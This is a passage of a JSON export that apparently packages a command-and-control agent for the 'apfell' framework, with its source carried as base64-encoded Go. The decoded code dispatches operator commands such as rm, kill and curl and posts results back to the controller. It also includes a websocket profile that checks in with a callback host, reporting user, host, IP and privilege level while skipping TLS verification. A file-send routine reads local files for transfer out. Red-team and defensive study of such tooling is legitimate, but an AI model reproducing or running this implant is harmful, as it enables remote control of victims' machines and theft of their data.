LlRhc2tzW2pdKQoJCQkJCWJyZWFrCgkJCQljYXNlIDI4OgoJCQkJCS8vIFByaW50IHdvcmtpbmcgZGlyZWN0b3J5CgkJCQkJZ28gcHdkLlJ1bih0YXNrLlRhc2tzW2pdKQoJCQkJCWJyZWFrCgkJCQljYXNlIDI5OgoJCQkJCWdvIHJtLlJ1bih0YXNrLlRhc2tzW2pdKQoJCQkJCWJyZWFrCgkJCQljYXNlIDMwOgoJCQkJCWdvIGdldGVudi5SdW4odGFzay5UYXNrc1tqXSkKCQkJCQlicmVhawoJCQkJY2FzZSAzMToKCQkJCQlnbyBzZXRlbnYuUnVuKHRhc2suVGFza3Nbal0pCgkJCQkJYnJlYWsKCQkJCWNhc2UgMzI6CgkJCQkJZ28gdW5zZXRlbnYuUnVuKHRhc2suVGFza3Nbal0pCgkJCQkJYnJlYWsKCQkJCWNhc2UgMzM6CgkJCQkJZ28ga2lsbC5SdW4odGFzay5UYXNrc1tqXSkKCQkJCQlicmVhawoJCQkJY2FzZSAzNDoKCQkJCQlnbyBjdXJsLlJ1bih0YXNrLlRhc2tzW2pdKQoJCQkJCWJyZWFrCgkJCQljYXNlIDM1OgoJCQkJCWdvIHhwYy5SdW4odGFzay5UYXNrc1tqXSkKCQkJCQlicmVhawoJCQkJY2FzZSBOT05FX0NPREU6CgkJCQkJLy8gTm8gdGFza3MsIGRvIG5vdGhpbmcKCQkJCQlicmVhawoJCQkJfQoJCQl9CgkJCQoJCQkvLyBUT0RPOiBGaXggdGhpcwoJCQkvKmZvciBpIDo9IDA7IGkgPCBsZW4odGFza1NsaWNlKTsgaSsrIHsKCQkJCWlmIHRhc2tTbGljZVtpXS5UYXNrSUQgPT0gdG9BcGZlbGwuVGFza0l0ZW0uVGFza0lEICYmICF0YXNrU2xpY2VbaV0uSm9iLk1vbml0b3JpbmcgewoJCQkJCWlmIGkgIT0gKGxlbih0YXNrU2xpY2UpIC0gMSkgewoJCQkJCQl0YXNrU2xpY2UgPSBhcHBlbmQodGFza1NsaWNlWzppXSwgdGFza1NsaWNlW2krMTpdLi4uKQoJCQkJCX0gZWxzZSB7CgkJCQkJCXRhc2tTbGljZSA9IHRhc2tTbGljZVs6aV0KCQkJCQl9CgkJCQkJYnJlYWsKCQkJCX0KCQkJfSovCgoJCQkvLyBsb29wIHRocm91Z2ggYWxsIHRhc2sgcmVzcG9uc2VzCgkJCQoJCQlpZiBsZW4ocHJvZmlsZXMuVGFza1Jlc3BvbnNlcykgPiAwIHsKCQkJCXJlc3BvbnNlTXNnIDo9IHN0cnVjdHMuVGFza1Jlc3BvbnNlTWVzc2FnZXt9CgkJCQlyZXNwb25zZU1zZy5BY3Rpb24gPSAicG9zdF9yZXNwb25zZSIKCQkJCXJlc3BvbnNlTXNnLlJlc3BvbnNlcyA9IG1ha2UoW11qc29uLlJhd01lc3NhZ2UsIDApCgkJCQlyZXNwb25zZU1zZy5EZWxlZ2F0ZXMgPSBtYWtlKFtdanNvbi5SYXdNZXNzYWdlLCAwKQoJCQkJc2l6ZSA6PSAxMDI0MDAwIC8vIFNldCB0aGUgY2h1bmtzaXplCgkJCQkvLyBDaHVuayB0aGUgcmVzcG9uc2UKCgkJCQl0b3RhbCA6PSB0b3RhbFNpemUocHJvZmlsZXMuVGFza1Jlc3BvbnNlcykKCQkJCWlmIHRvdGFsIDwgc2l6ZSB7CgkJCQkJbXUuTG9jaygpCgkJCQkJcmVzcG9uc2VNc2cuUmVzcG9uc2VzID0gYXBwZW5kKHJlc3BvbnNlTXNnLlJlc3BvbnNlcywgcHJvZmlsZXMuVGFza1Jlc3BvbnNlcy4uLikKCQkJCQlwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gbWFrZShbXWpzb24uUmF3TWVzc2FnZSwgMCkKCQkJCQltdS5VbmxvY2soKQoJCQkJfSBlbHNlIHsKCQkJCQlyZXNwb25zZU1zZy5SZXNwb25zZXMgPSBhcHBlbmQocmVzcG9uc2VNc2cuUmVzcG9uc2VzLCBwcm9maWxlcy5UYXNrUmVzcG9uc2VzWzBdKQoJCQkJCWlmIGxlbihwcm9maWxlcy5UYXNrUmVzcG9uc2VzKSA+IDEgewoJCQkJCQltdS5Mb2NrKCkKCQkJCQkJXywgcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IHByb2ZpbGVzLlRhc2tSZXNwb25zZXNbMF0sIHByb2ZpbGVzLlRhc2tSZXNwb25zZXNbMTpdCgkJCQkJCW11LlVubG9jaygpCgkJCQkJfSBlbHNlIHsKCQkJCQkJbXUuTG9jaygpCgkJCQkJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBtYWtlKFtdanNvbi5SYXdNZXNzYWdlLCAwKQoJCQkJCQltdS5VbmxvY2soKQoJCQkJCX0KCQkJCX0KCgkJCQkKCQkJCWVuY1Jlc3BvbnNlLCBfIDo9IGpzb24uTWFyc2hhbChyZXNwb25zZU1zZykKCQkJCS8vbG9nLlByaW50ZigiUmVzcG9uc2UgdG8gYXBmZWxsOiAlc1xuIiwgZW5jUmVzcG9uc2UpCgkJCQkvLyBQb3N0IGFsbCByZXNwb25zZXMgdG8gYXBmZWxsCgkJCQlyZXNwIDo9IHByb2ZpbGUuUG9zdFJlc3BvbnNlKGVuY1Jlc3BvbnNlLCB0cnVlKQoJCQkJaWYgbGVuKHJlc3ApID4gMCB7CgkJCQkJLy9sb2cuUHJpbnRmKCJSYXcgcmVzcDogXG4gJXMiLCBzdHJpbmcocmVzcCkpCgkJCQkJZ28gaGFuZGxlUmVzcG9uc2VzKHJlc3AsIGJhY2tncm91bmRUYXNrcykKCQkJCX0KCQkJCQoJCQl9CgkJCQoKCgkJCS8vIEl0ZXJhdGUgb3ZlciBmaWxlIHVwbG9hZHMKCQkJaWYgbGVuKHByb2ZpbGVzLlVwbG9hZFJlc3BvbnNlcykgPiAwIHsKCQkJCXZhciB1cGxvYWRNc2cganNvbi5SYXdNZXNzYWdlCgkJCQlpZiBsZW4ocHJvZmlsZXMuVXBsb2FkUmVzcG9uc2VzKSA+IDEgewoJCQkJCS8vIFBvcCBmcm9tIHRoZSBmcm9udCBpZiB0aGVyZSBpcyBtb3JlIHRoYW4gb25lCgkJCQkJdXBsb2FkTXNnLCBwcm9maWxlcy5VcGxvYWRSZXNwb25zZXMgPSBwcm9maWxlcy5VcGxvYWRSZXNwb25zZXNbMF0sIHByb2ZpbGVzLlVwbG9hZFJlc3BvbnNlc1sxOl0KCQkJCX0gZWxzZSB7CgkJCQkJdXBsb2FkTXNnID0gcHJvZmlsZXMuVXBsb2FkUmVzcG9uc2VzWzBdCgkJCQkJcHJvZmlsZXMuVXBsb2FkUmVzcG9uc2VzID0gbWFrZShbXWpzb24uUmF3TWVzc2FnZSwgMCkKCQkJCX0KCQkJCQoJCQkJLy9lbmNSZXNwb25zZSwgXyA6PSBqc29uLk1hcnNoYWwodXBsb2FkTXNnKQoJCQkJLy8gUG9zdCBhbGwgcmVzcG9uc2VzIHRvIGFwZmVsbAoJCQkJcmVzcCA6PSBwcm9maWxlLlBvc3RSZXNwb25zZShbXWJ5dGUodXBsb2FkTXNnKSwgdHJ1ZSkKCQkJCWlmIGxlbihyZXNwKSA+IDAgewoJCQkJCWdvIGhhbmRsZUZpbGVVcGxvYWRSZXNwb25zZShyZXNwLCBiYWNrZ3JvdW5kVGFza3MpCgkJCQl9CgkJCQkKCQkJfQoJCQkKCQkJCgkJfQoKCQkvLyBsb29wIHRocm91Z2ggYWxsIHRhc2sgcmVzcG9uc2VzIGJlZm9yZSBleGl0aW5nCgkJcmVzcG9uc2VNc2cgOj0gc3RydWN0cy5UYXNrUmVzcG9uc2VNZXNzYWdle30KCQlyZXNwb25zZU1zZy5BY3Rpb24gPSAicG9zdF9yZXNwb25zZSIKCQlyZXNwb25zZU1zZy5SZXNwb25zZXMgPSBtYWtlKFtdanNvbi5SYXdNZXNzYWdlLCAwKQoJCXJlc3BvbnNlTXNnLkRlbGVnYXRlcyA9IG1ha2UoW11qc29uLlJhd01lc3NhZ2UsIDApCgkJc2l6ZSA6PSA1MTIwMDAgLy8gU2V0IHRoZSBjaHVua3NpemUKCQkvLyBDaHVuayB0aGUgcmVzcG9uc2UKCQlmb3IgaiA6PSAwOyBqIDwgbGVuKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMpOyBqKysgewoJCQlpZiBsZW4ocHJvZmlsZXMuVGFza1Jlc3BvbnNlc1tqXSkgPCBzaXplIHsKCQkJCXJlc3BvbnNlTXNnLlJlc3BvbnNlcyA9IGFwcGVuZChyZXNwb25zZU1zZy5SZXNwb25zZXMsIHByb2ZpbGVzLlRhc2tSZXNwb25zZXNbal0pCgkJCX0gZWxzZSBpZiBsZW4ocmVzcG9uc2VNc2cuUmVzcG9uc2VzKSA8IDEgJiYgbGVuKHByb2ZpbGVzLlRhc2tSZXNwb25zZXNbal0pID4gc2l6ZSB7IC8vIElmIHRoZSByZXNwb25zZSBpcyBiaWdnZXIgdGhhbiBjaHVuayBzaXplIGFuZCB0aGVyZSBhcmVuJ3QgYW55IHJlc3BvbnNlcyBpbiByZXNwb25zZU1zZy5SZXNwb25zZXMKCQkJCXJlc3BvbnNlTXNnLlJlc3BvbnNlcyA9IGFwcGVuZChyZXNwb25zZU1zZy5SZXNwb25zZXMsIHByb2ZpbGVzLlRhc2tSZXNwb25zZXNbal0pCgkJCQlpZiBqIDwgbGVuKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMpIC0gMSB7CgkJCQkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IHByb2ZpbGVzLlRhc2tSZXNwb25zZXNbaisxOl0KCQkJCX0gZWxzZSB7CgkJCQkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IG1ha2UoW11qc29uLlJhd01lc3NhZ2UsIDApCgkJCQl9CgkJCQlicmVhawoJCQl9IGVsc2UgaWYgbGVuKHJlc3BvbnNlTXNnLlJlc3BvbnNlcykgPiAwICYmIGxlbihwcm9maWxlcy5UYXNrUmVzcG9uc2VzW2pdKSA+IHNpemUgewoJCQkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IHByb2ZpbGVzLlRhc2tSZXNwb25zZXNbajpdCgkJCQlicmVhawoJCQl9CgoJCQlpZiBsZW4ocmVzcG9uc2VNc2cuUmVzcG9uc2VzKSA9PSBsZW4ocHJvZmlsZXMuVGFza1Jlc3BvbnNlcykgewoJCQkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IG1ha2UoW11qc29uLlJhd01lc3NhZ2UsIDApCgkJCQlicmVhawoJCQl9CgkJCXNpemUgPSBzaXplIC0gbGVuKHByb2ZpbGVzLlRhc2tSZXNwb25zZXNbal0pCgkJfQoKCQllbmNSZXNwb25zZSwgXyA6PSBqc29uLk1hcnNoYWwocmVzcG9uc2VNc2cpCgkJLy8gUG9zdCBhbGwgcmVzcG9uc2VzIHRvIGFwZmVsbAoJCV8gPSBwcm9maWxlLlBvc3RSZXNwb25zZShlbmNSZXNwb25zZSwgdHJ1ZSkKCX0KfQo="
        }
      ],
      "support_scripts": [
        {
          "name": "create_table",
          "script": "ZnVuY3Rpb24oaGVhZGVycywgZGF0YSl7CiAgdmFyIG91dHB1dCA9ICI8dGFibGUgc3R5bGU9J292ZXJmbG93OnNjcm9sbDt3aGl0ZS1zcGFjZTpub3dyYXA7d2lkdGg6MTAwJTtjb2xvcjp3aGl0ZScgY2xhc3M9J3RhYmxlLXN0cmlwZWQgdGFibGUtaG92ZXIgYm9yZGVyIGJvcmRlci1kYXJrIHNoYWRvdyB0YWJsZS1jb25kZW5zZWQgdGFibGUtZGFyayc+IjsKICBvdXRwdXQgKz0gIjx0cj4iOwogIGZvcih2YXIgaSA9IDA7IGkgPCBoZWFkZXJzLmxlbmd0aDsgaSsrKXsKICAgIG91dHB1dCArPSAiPHRoIHN0eWxlPSdiYWNrZ3JvdW5kLWNvbG9yOiMzOTM0ODU7Y29sb3I6d2hpdGU7aGVpZ2h0OjQwcHg7dGV4dC1hbGlnbjpsZWZ0O3BhZGRpbmc6MHB4IDBweCAwcHggMjBweDt3aWR0aDoiICsgaGVhZGVyc1tpXVsnc2l6ZSddICsgIicgb25jbGljaz1cInNvcnRfdGFibGUodGhpcylcIj4iICsgaGVhZGVyc1tpXVsnbmFtZSddLnRvVXBwZXJDYXNlKCkgKyAiPC90aD4iOwogIH0KICBvdXRwdXQgKz0gIjwvdHI+IjsKICBmb3IodmFyIGkgPSAwOyBpIDwgZGF0YS5sZW5ndGg7IGkrKyl7CiAgICBvdXRwdXQgKz0gIjx0ciBzdHlsZT0ndGV4dC1hbGlnbjpsZWZ0OyIgKyBkYXRhW2ldWydyb3ctc3R5bGUnXSArICInPiI7CiAgICBmb3IodmFyIGogPSAwOyBqIDwgaGVhZGVycy5sZW5ndGg7IGorKyl7CiAgICAgaWYoZGF0YVtpXVsnY2VsbC1zdHlsZSddLmhhc093blByb3BlcnR5KGhlYWRlcnNbal0pKXsKICAgICAgICBvdXRwdXQgKz0gIjx0ZCBzdHlsZT0ncGFkZGluZzowcHggMHB4IDBweCAyMHB4OyIgKyBkYXRhW2ldWydjZWxsLXN0eWxlJ11baGVhZGVyc1tqXVsnbmFtZSddXSArICInPiIgKyBkYXRhW2ldW2hlYWRlcnNbal1bJ25hbWUnXV0gKyAiPC90ZD4iOwogICAgIH0KICAgICBlbHNlewogICAgICAgIG91dHB1dCArPSAiPHRkIHN0eWxlPSdwYWRkaW5nOjBweCAwcHggMHB4IDIwcHgnPiIgKyBkYXRhW2ldW2hlYWRlcnNbal1bJ25hbWUnXV0gKyAiPC90ZD4iOwogICAgIH0KICAgIH0KICAgIG91dHB1dCArPSAiPC90cj4iOwogIH0KICBvdXRwdXQgKz0gIjwvdGFibGU+IjsKICByZXR1cm4gb3V0cHV0Owp9"
        },
        {
          "name": "collapsable",
          "script": "ZnVuY3Rpb24oaGVhZGVyLCBlbGVtZW50LCB1bmlxdWVfaWQpewoJLy90YWtlcyBpbiBpbmZvcm1hdGlvbiBhYm91dCB0aGUgaGVhZGVyIHRvIG1ha2UgYW5kIHRoZSBlbGVtZW50IHRvIGNvbGxhcHNlIHdpdGhpbiBpdCAoYXMgYSBzdHJpbmcpCgl2YXIgb3V0cHV0ID0gIjxkaXYgY2xhc3M9J2NhcmQnPjxkaXYgY2xhc3M9J2NhcmQtaGVhZGVyIGJvcmRlciBib3JkZXItZGFyayBzaGFkb3cnPjxhIGNsYXNzPSdidG4nIHR5cGU9J2J1dHRvbicgZGF0YS10b2dnbGU9J2NvbGxhcHNlJyBkYXRhLXRhcmdldD0nI2JzdGFzayIgKyB1bmlxdWVfaWQgKyAiJyBhcmlhLWV4cGFuZGVkPSdmYWxzZScgYXJpYS1jb250cm9scz0nYnN0YXNrIiArIHVuaXF1ZV9pZCArICInPiIrIGhlYWRlclsnbmFtZSddICsgIjwvYT48L2Rpdj4iOwogICAgICBvdXRwdXQgKz0gIjxkaXYgY2xhc3M9J2NvbGxhcHNlJyBpZD1cImJzdGFzayIgKyB1bmlxdWVfaWQgKyAiXCIgc3R5bGU9J3dpZHRoOjEwMCUnPiI7CiAgICAgIG91dHB1dCArPSAiPGRpdiBjbGFzcz0nYmctY2FyZC1ib2R5LWwyIGNhcmQtYm9keSBib3JkZXIgYm9yZGVyLWRhcmsgc2hhZG93Jz4iICsgZWxlbWVudCArICI8L2Rpdj48L2Rpdj48L2Rpdj4iOwogIHJldHVybiBvdXRwdXQ7Cn0="
        }
      ],
      "c2_profiles": {
        "websocket": [
          {
            "websocket.go": "Ly8gK2J1aWxkIHdlYnNvY2tldAoKcGFja2FnZSBwcm9maWxlcwoKaW1wb3J0ICgKCSJieXRlcyIKCSJjcnlwdG8vcnNhIgoJImVuY29kaW5nL2Jhc2U2NCIKCSJlbmNvZGluZy9qc29uIgoJImZtdCIKCSJtYXRoIgoJIm5ldC9odHRwIgoJIm9zIgoJInJlZmxlY3QiCgkic3RyaW5ncyIKCSJ0aW1lIgoJInN5bmMiCgkiY3J5cHRvL3RscyIKCS8vImxvZyIKCgkiZ2l0aHViLmNvbS9nb3JpbGxhL3dlYnNvY2tldCIKCSJwa2cvdXRpbHMvY3J5cHRvIgoJInBrZy91dGlscy9mdW5jdGlvbnMiCgkicGtnL3V0aWxzL3N0cnVjdHMiCikKCnZhciBtdSBzeW5jLk11dGV4Cgp2YXIgQ29uZmlnID0gc3RydWN0cy5XZWJzb2NrZXRjb25maWd7CgkiZW5jcnlwdGVkX2V4Y2hhbmdlX2NoZWNrIiwKCSJBRVNQU0siLAoJImNhbGxiYWNrX2hvc3Q6Y2FsbGJhY2tfcG9ydC8iLAoJIlVTRVJfQUdFTlQiLAoJY2FsbGJhY2tfaW50ZXJ2YWwsCgkiZG9tYWluX2Zyb250IiwKCWNhbGxiYWNrX2ppdHRlciwKCSJFTkRQT0lOVF9SRVBMQUNFIiwKfQoKdHlwZSBDMldlYnNvY2tldHMgc3RydWN0IHsKCUhvc3RIZWFkZXIgICAgIHN0cmluZwoJQmFzZVVSTCAgICAgICAgc3RyaW5nCglJbnRlcnZhbCAgICAgICBpbnQKCUppdHRlciAgICAgICAgIGludAoJRXhjaGFuZ2luZ0tleXMgYm9vbAoJQXBmZWxsSUQgICAgICAgc3RyaW5nCglVc2VyQWdlbnQgICAgICBzdHJpbmcKCVVVSUQgICAgICAgICAgIHN0cmluZwoJS2V5ICAgICAgICAgc3RyaW5nCglSc2FQcml2YXRlS2V5ICAqcnNhLlByaXZhdGVLZXkKCUNvbm4gICAgICAgICAgICp3ZWJzb2NrZXQuQ29ubgoJRW5kcG9pbnQgCSBzdHJpbmcKfQoKZnVuYyBuZXdQcm9maWxlKCkgUHJvZmlsZSB7CglyZXR1cm4gJkMyV2Vic29ja2V0c3t9Cn0KCmZ1bmMgKGMgQzJXZWJzb2NrZXRzKSBnZXRTbGVlcFRpbWUoKSBpbnR7CiAgICByZXR1cm4gYy5JbnRlcnZhbCArIGludChtYXRoLlJvdW5kKChmbG9hdDY0KGMuSW50ZXJ2YWwpICogKHNlZWRlZFJhbmQuRmxvYXQ2NCgpICogZmxvYXQ2NChjLkppdHRlcikpL2Zsb2F0NjQoMTAwLjApKSkpOwp9CgpmdW5jIChjIEMyV2Vic29ja2V0cykgU2xlZXBJbnRlcnZhbCgpIGludCB7CglyZXR1cm4gYy5nZXRTbGVlcFRpbWUoKQp9CgpmdW5jIChjICpDMldlYnNvY2tldHMpIFNldFNsZWVwSW50ZXJ2YWwoaW50ZXJ2YWwgaW50KSB7CgljLkludGVydmFsID0gaW50ZXJ2YWwKfQoKZnVuYyAoYyAqQzJXZWJzb2NrZXRzKSBTZXRTbGVlcEppdHRlcihqaXR0ZXIgaW50KXsKICAgIGMuSml0dGVyID0gaml0dGVyCn0KCmZ1bmMgKGMgQzJXZWJzb2NrZXRzKSBBcGZJRCgpIHN0cmluZyB7CglyZXR1cm4gYy5BcGZlbGxJRAp9CgpmdW5jIChjICpDMldlYnNvY2tldHMpIFNldEFwZmVsbElEKG5ld0FwZiBzdHJpbmcpIHsKCWMuQXBmZWxsSUQgPSBuZXdBcGYKfQoKZnVuYyAoYyBDMldlYnNvY2tldHMpIFByb2ZpbGVUeXBlKCkgc3RyaW5nIHsKCXQgOj0gcmVmbGVjdC5UeXBlT2YoYykKCXJldHVybiB0Lk5hbWUoKQp9CgpmdW5jIChjICpDMldlYnNvY2tldHMpIENoZWNrSW4oaXAgc3RyaW5nLCBwaWQgaW50LCB1c2VyIHN0cmluZywgaG9zdCBzdHJpbmcsIG9wZXJhdGluZ3N5c3RlbSBzdHJpbmcsIGFyY2ggc3RyaW5nKSBpbnRlcmZhY2V7fSB7CgkvLyBTZXQgdGhlIEMyIFByb2ZpbGUgdmFsdWVzCgljLkJhc2VVUkwgPSBDb25maWcuQmFzZVVSTAoJYy5JbnRlcnZhbCA9IENvbmZpZy5TbGVlcAoJYy5KaXR0ZXIgPSBDb25maWcuSml0dGVyCgoJaWYgc3RyaW5ncy5Db250YWlucyhDb25maWcuS0VZWCwgIlQiKSB7CgkJYy5FeGNoYW5naW5nS2V5cyA9IHRydWUKCX0gZWxzZSB7CgkJYy5FeGNoYW5naW5nS2V5cyA9IGZhbHNlCgl9CgoJaWYgbGVuKENvbmZpZy5LZXkpID4gMCB7CgkJYy5LZXkgPSBDb25maWcuS2V5Cgl9IGVsc2UgewoJCWMuS2V5ID0gIiIKCX0KCglpZiBsZW4oQ29uZmlnLkhvc3RIZWFkZXIpID4gMCB7CgkJYy5Ib3N0SGVhZGVyID0gQ29uZmlnLkhvc3RIZWFkZXIKCX0KCglpZiBsZW4oQ29uZmlnLlVzZXJBZ2VudCkgPiAwIHsKCQljLlVzZXJBZ2VudCA9IENvbmZpZy5Vc2VyQWdlbnQKCX0gZWxzZSB7CgkJYy5Vc2VyQWdlbnQgPSAiTW96aWxsYS81LjAgKE1hY2ludG9zaDsgVTsgSW50ZWwgTWFjIE9TIFg7IGVuKSBBcHBsZVdlYktpdC80MTkuMyAoS0hUTUwsIGxpa2UgR2Vja28pIFNhZmFyaS80MTkuMyIKCX0KCgljLkVuZHBvaW50ID0gQ29uZmlnLkVuZHBvaW50CgoJLy8gRXN0YWJsaXNoIGEgY29ubmVjdGlvbiB0byB0aGUgd2Vic29ja2V0cyBzZXJ2ZXIKCXVybCA6PSBmbXQuU3ByaW50ZigiJXMlcyIsIGMuQmFzZVVSTCwgQ29uZmlnLkVuZHBvaW50KQoJaGVhZGVyIDo9IG1ha2UoaHR0cC5IZWFkZXIpCgloZWFkZXIuU2V0KCJVc2VyLUFnZW50IiwgYy5Vc2VyQWdlbnQpCgkKCS8vIFNldCB0aGUgaG9zdCBoZWFkZXIKCWlmIChsZW4oYy5Ib3N0SGVhZGVyKSA+IDApIHsKCQloZWFkZXIuU2V0KCJIb3N0IiwgYy5Ib3N0SGVhZGVyKQoJfQoKCWQgOj0gd2Vic29ja2V0LkRpYWxlcnsKCQlUTFNDbGllbnRDb25maWc6ICZ0bHMuQ29uZmlnewoJCQlJbnNlY3VyZVNraXBWZXJpZnk6IHRydWUsCgkJfSwKCX0KCWNvbm5lY3Rpb24sIF8sIGVyciA6PSBkLkRpYWwodXJsLCBoZWFkZXIpCgoJaWYgZXJyICE9IG5pbCB7CgkJLy9sb2cuUHJpbnRmKCJFcnJvciBjb25uZWN0aW5nIHRvIHNlcnZlciAlcyAiLCBlcnIuRXJyb3IoKSkKCQlyZXR1cm4gc3RydWN0cy5DaGVja0luTWVzc2FnZVJlc3BvbnNle0FjdGlvbjogImNoZWNraW4iLCBTdGF0dXM6ICJmYWlsZWQifQoJfQoKCWMuQ29ubiA9IGNvbm5lY3Rpb24KCgkvL2xvZy5QcmludGxuKCJDb25uZWN0ZWQgdG8gc2VydmVyICIpCgl2YXIgcmVzcCBbXWJ5dGUKCgljLlVVSUQgPSBVVUlECgljLkFwZmVsbElEID0gYy5VVUlECgljaGVja2luIDo9IHN0cnVjdHMuQ2hlY2tJbk1lc3NhZ2V7fQoJY2hlY2tpbi5BY3Rpb24gPSAiY2hlY2tpbiIKCWNoZWNraW4uVXNlciA9IHVzZXIKCWNoZWNraW4uSG9zdCA9IGhvc3QKCWNoZWNraW4uSVAgPSBpcAoJY2hlY2tpbi5QaWQgPSBwaWQKCWNoZWNraW4uVVVJRCA9IGMuVVVJRAoJY2hlY2tpbi5PUyA9IG9wZXJhdGluZ3N5c3RlbQoJY2hlY2tpbi5BcmNoaXRlY3R1cmUgPSBhcmNoCglpZiBmdW5jdGlvbnMuSXNFbGV2YXRlZCgpIHsKCQljaGVja2luLkludGVncml0eUxldmVsID0gMwoJfSBlbHNlIHsKCQljaGVja2luLkludGVncml0eUxldmVsID0gMgoJfQoJY2hlY2tpbk1zZywgXyA6PSBqc29uLk1hcnNoYWwoY2hlY2tpbikKCglpZiBjLkV4Y2hhbmdpbmdLZXlzIHsKCQlfID0gYy5OZWdvdGlhdGVLZXkoKQoJfQoKCXJlc3AgPSBjLnNlbmREYXRhKCIiLCBjaGVja2luTXNnKQoJcmVzcG9uc2UgOj0gc3RydWN0cy5DaGVja0luTWVzc2FnZVJlc3BvbnNle30KCWVyciA9IGpzb24uVW5tYXJzaGFsKHJlc3AsICZyZXNwb25zZSkKCWlmIGVyciAhPSBuaWwgewoJCS8vbG9nLlByaW50ZigiRXJyb3IgdW5tYXJzaGFsaW5nIHJlc3BvbnNlOiAlcyIsIGVyci5FcnJvcigpKQoJCXJldHVybiBzdHJ1Y3RzLkNoZWNrSW5NZXNzYWdlUmVzcG9uc2V7U3RhdHVzOiAiZmFpbGVkIn0KCX0KCglpZiBsZW4ocmVzcG9uc2UuSUQpID4gMCB7CgkJYy5BcGZlbGxJRCA9IHJlc3BvbnNlLklECgl9CgoJcmV0dXJuIHJlc3BvbnNlCn0KCmZ1bmMgKGMgKkMyV2Vic29ja2V0cykgR2V0VGFza2luZygpIGludGVyZmFjZXt9IHsKCXJlcXVlc3QgOj0gc3RydWN0cy5UYXNrUmVxdWVzdE1lc3NhZ2V7fQoJcmVxdWVzdC5BY3Rpb24gPSAiZ2V0X3Rhc2tpbmciCglyZXF1ZXN0LlRhc2tpbmdTaXplID0gLTEKCglyYXcsIGVyciA6PSBqc29uLk1hcnNoYWwocmVxdWVzdCkKCglpZiBlcnIgIT0gbmlsIHsKCQkvL2xvZy5QcmludGYoIkVycm9yIHVubWFyc2hhbGxpbmc6ICVzIiwgZXJyLkVycm9yKCkpCgl9CgoJcmF3VGFzayA6PSBjLnNlbmREYXRhKCIiLCByYXcpCgl0YXNrIDo9IHN0cnVjdHMuVGFza1JlcXVlc3RNZXNzYWdlUmVzcG9uc2V7fQoJZXJyID0ganNvbi5Vbm1hcnNoYWwocmF3VGFzaywgJnRhc2spCgoJaWYgZXJyICE9IG5pbCB7CgkJLy9sb2cuUHJpbnRmKCJFcnJvciB1bm1hcnNoYWxsaW5nIHRhc2sgZGF0YTogJXMiLCBlcnIuRXJyb3IoKSkKCQlyZXR1cm4gdGFzawoJfQoKCXJldHVybiB0YXNrCn0KCmZ1bmMgKGMgKkMyV2Vic29ja2V0cykgUG9zdFJlc3BvbnNlKG91dHB1dCBbXWJ5dGUsIHNraXBDaHVua2luZyBib29sKSBbXWJ5dGUgewoJcmV0dXJuIGMuc2VuZERhdGEoIiIsIG91dHB1dCkKfQoKZnVuYyAoYyAqQzJXZWJzb2NrZXRzKSBTZW5kRmlsZSh0YXNrIHN0cnVjdHMuVGFzaywgcGFyYW1zIHN0cmluZywgY2ggY2hhbiBbXWJ5dGUpIHsKCglwYXRoIDo9IHRhc2suUGFyYW1zCgkvLyBHZXQgdGhlIGZpbGUgc2l6ZSBmaXJzdCBhbmQgdGhlbiB0aGUgIyBvZiBjaHVua3MgcmVxdWlyZWQKCWZpbGUsIGVyciA6PSBvcy5PcGVuKHBhdGgpCgoJaWYgZXJyICE9IG5pbCB7CgkJZXJyUmVzcG9uc2UgOj0gc3RydWN0cy5SZXNwb25zZXt9CgkJZXJyUmVzcG9uc2UuQ29tcGxldGVkID0gdHJ1ZQoJCWVyclJlc3BvbnNlLlRhc2tJRCA9IHRhc2suVGFza0lECgkJZXJyUmVzcG9uc2UuVXNlck91dHB1dCA9IGZtdC5TcHJpbnRmKCJFcnJvciBvcGVuaW5nIGZpbGU6ICVzIiwgZXJyLkVycm9yKCkpCgkJZXJyUmVzcG9uc2VFbmMsIF8gOj0ganNvbi5NYXJzaGFsKGVyclJlc3BvbnNlKQoJCW11LkxvY2soKQoJCVRhc2tSZXNwb25zZXMgPSBhcHBlbmQoVGFza1Jlc3BvbnNlcywgZXJyUmVzcG9uc2VFbmMpCgkJbXUuVW5sb2NrKCkKCQlyZXR1cm4KCX0KCglmaSwgZXJyIDo9IGZpbGUuU3RhdCgpCglpZiBlcnIgIT0gbmlsIHsKCQllcnJSZXNwb25zZSA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCQllcnJSZXNwb25zZS5Db21wbGV0ZWQgPSB0cnVlCgkJZXJyUmVzcG9uc2UuVGFza0lEID0gdGFzay5UYXNrSUQKCQllcnJSZXNwb25zZS5Vc2VyT3V0cHV0ID0gZm10LlNwcmludGYoIkVycm9yIGdldHRpbmcgZmlsZSBzaXplOiAlcyIsIGVyci5FcnJvcigpKQoJCWVyclJlc3BvbnNlRW5jLCBfIDo9IGpzb24uTWFyc2hhbChlcnJSZXNwb25zZSkKCQltdS5Mb2NrKCkKCQlUYXNrUmVzcG9uc2VzID0gYXBwZW5kKFRhc2tSZXNwb25zZXMsIGVyclJlc3BvbnNlRW5jKQoJCW11LlVubG9jaygpCgkJcmV0dXJuCgl9CgoJc2l6ZSA6PSBmaS5TaXplKCkKCXJhdyA6PSBtYWtlKFtdYnl0ZSwgc2l6ZSkKCV8sIGVyciA9IGZpbGUuUmVhZChyYXcpCglpZiBlcnIgIT0gbmlsIHsKCQllcnJSZXNwb25zZSA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCQllcnJSZXNwb25zZS5Db21wbGV0ZWQgPSB0cnVlCgkJZXJyUmVzcG9uc2UuVGFza0lEID0gdGFzay5UYXNrSUQKCQllcnJSZXNwb25zZS5Vc2VyT3V0cHV0ID0gZm10LlNwcmludGYoIkVycm9yIHJlYWRpbmcgZmlsZTogJXMiLCBlcnIuRXJyb3IoKSkKCQllcnJSZXNwb25zZUVuYywgXyA6PSBqc29uLk1hcnNoYWwoZXJyUmVzcG9uc2UpCgkJbXUuTG9jaygpCgkJVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChUYXNrUmVzcG9uc2VzLCBlcnJSZXNwb25zZUVuYykKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoKCV8gPSB